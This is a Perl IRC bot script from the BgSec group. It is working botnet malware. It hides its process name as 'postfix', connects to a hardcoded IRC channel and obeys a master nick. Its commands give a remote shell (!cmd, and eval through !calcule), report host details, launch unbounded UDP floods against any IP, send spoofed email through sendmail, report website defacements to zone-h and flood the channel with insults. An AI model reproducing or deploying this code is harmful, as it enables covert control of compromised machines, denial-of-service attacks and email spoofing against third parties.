#!/usr/bin/perl
######################################################
# Very dangerous rsrs 
# License:GPL2
# site: BgSec.com.br
# author: Cooler_
# this is another irc bot
######################################################
############################## Modules CPAN ,install this to run
use IO::Socket::INET;
use HTTP::Request;
use LWP::UserAgent;
############################## take Inputs
#print "What your nick man\?\n";
# chomp($master=<STDIN>); 
#print "what your CMD, can dont put 0\?\n";
#chomp($cmd=<STDIN>);
#print "what your id\?\n";
# chomp($id=<STDIN>); 
#print "what IRC server for bot in\?\n";
# chomp($server=<STDIN>); 
#print "what chanel\?\n";
# chomp($canale=<STDIN>); 
#print "what port\? ex 6667\n";
# chomp($porta=<STDIN>); 
############################## Init config
 $master="Cooler_";
 $cmd="x";
 $id="334";
 $server="irc.botecounix.com.br";
 $canale="#c00kies";
 $porta="6667";

##############################  Configs
my $name = "Hazard2";
my $processo = 'postfix';
my $nick="[TogBot]B0t";
my $identify = "Chacy_06";
############################## ascii img
@img = ("  ",
     "                 boing         boing         boing          ",      
     "       0-0           . - .         . - .         . - .      ",    
     "      (\_/)\       '       `.   ,'       `.   ,'       .    ",    
     "       `-'\ `--.___,         . .           . .          .   ",    
     "          '\( ,_.-'                                         ",    
     "             \\               \"             \"          \" ",    
     "             ^'                                             ");  

############################# Fork process clone toconect IRC
 my $pid=fork;
 exit if $pid;
 $0="$processo"."\0"x16;
############################### Constructor conector to socket
my $sk = IO::Socket::INET->new(PeerAddr=>"$server",
                               PeerPort=>"$porta",
                                Proto=>"tcp") or die "erro na conexao\n";
 $sk->autoflush(1);
 print $sk "NICK $nick\r\n";
 print $sk "USER $identify 8 * :$name\r\n";
 print $sk "JOIN $canale\r\n";
 print $sk "PRIVMSG $canale :3 TogBot_bot 5 em Perl  by Cooler_\r\n";
 print $sk "PRIVMSG $canale :3 BugSec 5 TEam 3 _mlk_,m0nad,I4K,Cooler_,sigsegv,belani 5 he nozes bugsec.com.br \r\n";
 
############################### regex to read irc chat
 while($line = <$sk>)
 {
  $line =~ s/\r\n$//;

  if ($line=~ /^PING \:(.*)/)
  {
   print "PONG :$1";
   print $sk "PONG :$1";
  }

################################ play this in irc "!versao now" and bot to speak your version
if($line =~ m/^\:$master\!(.*?)\@(.*?) PRIVMSG (.*?) :!versao (.*?)$/)
{
 stampa($sk, "PRIVMSG $canale :3 TogBot_Bot 7 version 1.0  3 beta ");
 stampa($sk, "PRIVMSG $canale :3 Coded By Cooler_, 5 source based 3 in pbot");
 stampa($sk, "PRIVMSG $canale :5 BugSec 3 thanks 5 voidpointer,_mlk_,m0nad,I4k,belani,sigsegv");
 stampa($sk, "PRIVMSG $canale :3 Thanks 5 Perl monks  3 and all friends 5 , look bugsec.com.br ");
foreach(@img)
 {

  stampa($sk, "PRIVMSG $canale :3 $_");
 }
}

################################# play this on chanel with bot on "/msg botname !fala hello"
if($line =~ m/^\:$master\!(.*?)\@(.*?) PRIVMSG (.*?) :!fala (.*?)$/)
{
 my $fala=$4;
 stampa($sk, "PRIVMSG $canale : 7 $fala");
}


################################# play this on chanel with bot on "!cmd uname -a" is a shell 
if($line =~ m/^\:$master\!(.*?)\@(.*?) PRIVMSG (.*?) :!cmd (.*?)$/)
{
 if (my $pid = fork) {
 waitpid($pid, 0);
 } else {
  if (fork) {
   exit;
  } else {
   my $mal=$4;
   @shell=`$mal`;
   foreach (@shell) {
    stampa($sk, "PRIVMSG $canale : 7 $_"); 
   } 
  }
 }
} 


################################# play this on chanel with bot on "!ajuda now" to helping menu
if($line =~ m/^\:$master\!(.*?)\@(.*?) PRIVMSG (.*?) :!ajuda (.*?)$/)
{
 stampa($sk, "PRIVMSG $canale : 7 --==TogBot-bot==-- comandos de ajuda");
 stampa($sk, "PRIVMSG $canale : 5 !udp, 3 !rss <nome_site>, 5 !tempo sp sao_paulo,!cmd <comando>,  ");
 stampa($sk, "PRIVMSG $canale : 5 !wiki albert_einsten ,!calcule 2+2*2/3");
 stampa($sk, "PRIVMSG $canale : 5 !flood, 3 !alopra, 5 !saia, 3 !cor, 5 !hospedeiro ,!fala, !zone-h <grupo> <dominio>");
 stampa($sk, "PRIVMSG $canale : 5 !mail 3 <subject> 5 <sender> 3 <recipient> 5 <message>");
}

################################# play this on chanel with bot on "!hospedeiro now" to info your system 
if($line =~ m/^\:$master\!(.*?)\@(.*?) PRIVMSG (.*?) :!hospedeiro (.*?)$/)
{
 my $tempo=`uptime`; my $local=`pwd`; my $estatos=`id`; my @who=`who`; my @hd=`df -h`;
 stampa($sk, "PRIVMSG $canale : 7 --==TogBot-bot==-- Info Hospedeiro");
 stampa($sk, "PRIVMSG $canale : 3 Hora: $tempo  ");
 stampa($sk, "PRIVMSG $canale : 5 Sistema operacional: $^O 3 Operador: $master");
 stampa($sk, "PRIVMSG $canale : 3 local: $local 5 id: $estatos  ");
 stampa($sk, "PRIVMSG $canale : Quem esta usando a maquina do hospedeiro");
 foreach (@who) {
  stampa($sk, "PRIVMSG $canale : $_ "); 
 }
 stampa($sk, "PRIVMSG $canale : Vendo estatos do disco rigido");
 foreach (@hd) 
 {
  stampa($sk, "PRIVMSG $canale : $_ "); 
 }
 stampa($sk, "PRIVMSG $canale : 3 terminio dos estatos de controle ");
}
################################# calcule 
if($line =~ m/^\:$master\!(.*?)\@(.*?) PRIVMSG (.*?) :!calcule (.*?)$/)
{
 $exp=eval($4);
 stampa($sk, "PRIVMSG $canale : 3 resultado $exp");
}
################################# play this on chanel with bot on "!rss exploit-db.com"  
if($line =~ m/^\:$master\!(.*?)\@(.*?) PRIVMSG (.*?) :!rss (.*?)$/)
{
 $escolha=$4;
 if (my $pid = fork) {
  waitpid($pid, 0);
 } else {
  if (fork) {
   exit;
  } else {
   stampa($sk, "PRIVMSG $canale : 5 senhor 7 $master 5 irei 3 procurar 5 rss 3 novos ");
 
   $agent = new LWP::UserAgent; 
   $agent->agent('Mozilla/5.0 (X11; U; NetBSD i386; en-US; rv:1.8.1.12) Gecko/20080301 Firefox/2.0.0.12'); 
   $request = HTTP::Request->new('GET',$escolha);
   $result = $agent->request($request); 
   $xml = $result->content(); 
 #  open(RES,">","mille.txt");
 #  print RES @result; close(RES); open(RES,"<","mille.txt");
 #  @inhalt = <RES>; close(RES); unlink ("mille.txt");

  # foreach $shit (@inhalt)

   stampa($sk, "PRIVMSG $canale : 3 $escolha");
   @chars=split(/(.*?)\n/,$xml);
   foreach(@chars) 
   { 
    if( $_ =~ /<title>(.*?)<\/title>/g )
    {
     stampa($sk, "PRIVMSG $canale : 5 $1");
    }

    if( $_ =~ /<link>(.*?)<\/link>/g )
    {
     stampa($sk, "PRIVMSG $canale : 7 $1");
    }
 #   $shit =~ tr/</ /; $shit =~ tr/>/ /;
 #   $shit =~ tr/\// /; $shit =~ s/$escolha//ig;
 #   if($shit =~ m/title/i) 
 #   { 
 #    $shit =~ s/title/ /ig; push(@sploits,"$shit");
   } 
    stampa($sk, "PRIVMSG $canale : 3 RSS listado");
  } 
# foreach (@sploits) 
# {
#  stampa($sk, "PRIVMSG $canale : 7 $_ "); 
# }
#  stampa($sk, "PRIVMSG $canale : 5 RSS terminado 3 busca 5 por 3 novidades 3 senhor 7 $master");
# }

 }
}
################################# play !wiki mozart  
if($line =~ m/^\:$master\!(.*?)\@(.*?) PRIVMSG (.*?) :!wiki (.*?)$/)
{
 $reg=$4;
 $escolha1="http://pt.wikipedia.org/wiki/$reg";
 if (my $pid = fork) {
  waitpid($pid, 0);
 } else {
  if (fork) {
   exit;
  } else {
   stampa($sk, "PRIVMSG $canale : 5 senhor 7 $master 5 irei 3 procurar 5 no 3 Wikipedia $escolha1");
 
   $agent2 = new LWP::UserAgent; 
   $agent2->agent('Mozilla/5.0 (X11; U; NetBSD i386; en-US; rv:1.8.1.12) Gecko/20080301 Firefox/2.0.0.12'); 
   $request2 = HTTP::Request->new('GET',$escolha1);
   $result2 = $agent2->request($request2); 
   $xml2 = $result2->content(); 

   my $cont=1;
   stampa($sk, "PRIVMSG $canale : 3 $escolha1");
   @chars2=split(/(.*?)\n/,$xml2);
   foreach(@chars2) 
   { 
    if( $_ =~ /<h1 (.*?)>(.*?)<\/h1>/ )
    {
     $html3=$2;
     $html3 =~ s/<(?:[^>'"]*|(['"]).*?\1)*>//gs;
     stampa($sk, "PRIVMSG $canale : 5 $html3");
    }

    if( $_ =~ /<p>(.*?)<\/p>/ )
    {
     $html4=$1;
     $html4 =~ s/<(?:[^>'"]*|(['"]).*?\1)*>//gs;
     stampa($sk, "PRIVMSG $canale : 7 $html4");
     $cont+=1;
     sleep(3);
    }
    
    if($cont eq '5') { last; }
   } 
    stampa($sk, "PRIVMSG $canale : 3 wikipedia listado");
  } 

 }
}
################################# zone H
if($line =~ m/^\:$master\!(.*?)\@(.*?) PRIVMSG (.*?) :!zone\-h (.*?) (.*?)$/)
{
 $grupo=$4;
 $dominio=$5;
 if (my $pid = fork) {
  waitpid($pid, 0);
 } else {
  if (fork) {
   exit;
  } else {
# solução do _mlK_
#   use IO::Socket::INET;
#   $sock = IO::Socket::INET->new(PeerAddr => "www.zone-h.org", PeerPort => 80, Proto => "tcp") or next;
#   print $sock "POST /notify/single HTTP/1.0\r\n";
#   print $sock "Accept: */*\r\n";
#   print $sock "Referer: http://zone-h.org/notify/single\r\n";
#   print $sock "Accept-Language: pt-br\r\n";
#   print $sock "Content-Type: application/x-www-form-urlencoded\r\n";
#   print $sock "Connection: Keep-Alive\r\n";
#   print $sock "User-Agent: Mozilla/5.0 (X11; U; Linux i686; pt-BR; rv:1.8.1.3)\r\n";
#   print $sock "Host: www.zone-h.org\r\n";
#   $length=length("defacer=$grupo&domain1=http%3A%2F%2F$site[$a]&hackmode=15&reason=1");
#   print $sock "Content-Length: $length\r\n";
#   print $sock "Pragma: no-cache\r\n";
#   print $sock "\r\n";
#   print $sock "defacer=$grupo&domain1=http%3A%2F%2F$site[$a]&hackmode=15&reason=1\r\n";
#   close($sock);

   use HTTP::Request::Common qw(POST);

    my $browser = LWP::UserAgent->new;

    my $resp = $browser->post('http://www.zone-h.org/notify/single', 
                     ['defacer' => $grupo,
                      'domain1' => $dominio, 
                      'hackmode' => '15',
                      'reason'=>'1'
                     ]);
    my $saida = $browser->request($resp); 
    my $saida2=$browser->content;
    stampa($sk, "PRIVMSG $canale : 7 Enviado $grupo $dominio para zone-h");

  }
 }

}
################################# play this on chanel with bot on "!cor nick" flood msg
if($line =~ m/^\:$master\!(.*?)\@(.*?) PRIVMSG (.*?) :!cor (.*?)$/)
{
 my $teste=$4;
 for (my $conta=0;$conta<=12;$conta++) {
  stampa($sk, "PRIVMSG $canale :$conta Cala $conta a $conta boca $teste");
 }
}

################################# play this on chanel with bot on "!flood nick" to flood msg
if($line =~ m/^\:$master\!(.*?)\@(.*?) PRIVMSG (.*?) :!flood (.*?)$/)
{
 my $otario=$4;
 stampa($sk, "PRIVMSG $canale : 3 sim 5 senhor 7 $master 3 irei ofender 5 o $otario ");
 for(my $conta=0;$conta<=2;$conta++) 
 {
  stampa($sk, "PRIVMSG $canale : 3 Cala a boca 5 $otario");
  stampa($sk, "PRIVMSG $canale : 5 Voce nao he 3 caveira");
 }
}

################################# play this on chanel with bot on "!udp ip port time" to flood udp atack
if($line =~ m/^\:$master\!(.*?)\@(.*?) PRIVMSG (.*?) :!udp (.*?) (.*?) (.*?)$/)
{
 if(my $pid = fork) {
  waitpid($pid, 0);
 } else {
 if(fork) {
  exit;
 } else {
  my $targets=$4;
  my $portss=$5;
  my $time=$6;
  stampa($sk, "PRIVMSG $canale : 7 --==TogBot==-- FLooD UDP");
  stampa($sk, "PRIVMSG $canale : 3 Iniciando 5 ataque 3 UDP 5 Flood 3 senhor 7 $master");
  stampa($sk, "PRIVMSG $canale : 3 IP:$4 5 porta:$5 3 tempo:$6 5 ");
  socket(crazy, PF_INET, SOCK_DGRAM, 17);
  $iaddr = inet_aton("$targets");
  packets:
  for(;;) 
  {
   $size=$rand x $rand x $rand;
   send(crazy, 0, $size, sockaddr_in($portss, $iaddr)); 
  }
  stampa($sk, "PRIVMSG $canale : 5 acabando 3 com 5 o host 3 senhor ");
  randpackets:
  for(;;) 
  {
   $size=$rand x $rand x $rand;
   $port=int(rand 65000) +1;
   send(crazy, 0, $size, sockaddr_in($portss, $iaddr));}
  }
 }
 stampa($sk, "PRIVMSG $canale : 5 ataque 3 UDP 5 Flood 3 Terminado 5 senhor 7 $master ");
}

################################# play this on chanel with bot on "!alopra now" to flood all
if($line =~ m/^\:$master\!(.*?)\@(.*?) PRIVMSG (.*?) :!alopra (.*?)$/)
{
 my $otario=$4;
 for(my $conta=0;$conta<=2;$conta++) 
 {
  stampa($sk, "PRIVMSG $canale : 3 que 5 merda 3 este 5 canal");
  stampa($sk, "PRIVMSG $canale : 5 este 3 lugar 5 fede 3 soh inseto");
 }
}

################################# play this on chanel with bot on "!tempo sao_paulo" see the temperature for Brazil states
if($line =~ m/^\:$master\!(.*?)\@(.*?) PRIVMSG (.*?) :!tempo (.*?) (.*?)$/)
{
 if (my $pid = fork) {
  waitpid($pid, 0);
 } else {
  if (fork) {
   exit;
  } else {
   my $local=$4;
   my $estado=$5;
   stampa($sk, "PRIVMSG $canale : 7 --==TogBot==-- Temperatura Brasil");
   stampa($sk, "PRIVMSG $canale : 3 Vendo 5 Temperatura 3 senhor 7 $master");
   my $pagina="http://tempo.folha.com.br/$estado/$local/";
   $agent = new LWP::UserAgent;
   $request = HTTP::Request->new('GET',$pagina);
   $result = $agent->request($request);
   @result = $result->content();
   open(RES,">","temperatura.txt");
   print RES @result; close(RES); 
   open(RES,"<","temperatura.txt");
   @texto = <RES>; close(RES); 
   unlink("temperatura.txt");
   foreach(@texto)
   {
    if ($_ =~ m/^<p><b>Temperatura:<\/b> (.*?)<\/p>/) 
    {
     my $graus="$1";
     stampa($sk, "PRIVMSG $canale : 3 Local: 5 $local ");
     stampa($sk, "PRIVMSG $canale : 3 Temperatura: 5 $graus ");}}
     stampa($sk, "PRIVMSG $canale : 3 procura 5 terminada ");
    } 
   }
  }
############################## exit()
if($line =~ m/^\:$master\!(.*?)\@(.*?) PRIVMSG (.*?) :!saia (.*?)$/) 
{
 stampa ($sk, "PRIVMSG $canale :3 TogBot_Bot 5 Saindo 3 Senhor 7 $master");
 stampa($sk, "QUIT");
}

################################# play this on chanel with bot on "!mail subject sender recipient" to send e-mail 
if ($line =~ m/^\:$master\!(.*?)\@(.*?) PRIVMSG (.*?) :!mail (.*?) (.*?) (.*?) (.*?)/) 
{
 $subject = $4;
 $sender = $5;
 $recipient = $6;
 @corpo = $7;
 $mailtype = "content-type: text/html";
 $sendmail = '/usr/sbin/sendmail';
 open (SENDMAIL, "| $sendmail -t");
 print SENDMAIL "$mailtype\n";
 print SENDMAIL "Subject: $subject\n";
 print SENDMAIL "From: $sender\n";
 print SENDMAIL "To: $recipient\n\n";
 print SENDMAIL "@corpo\n\n";
 close (SENDMAIL);
 stampa ($sk, "PRIVMSG $canale :3 TogBot_Bot $print1 , mail enviado para $recipiend");
}


}

sub stampa()
{
 if ($#_ == '1') {
  my $sk = $_[0];
  print $sk "$_[1]\n";
 } else {
  print $sk "$_[0]\n";
 }
}

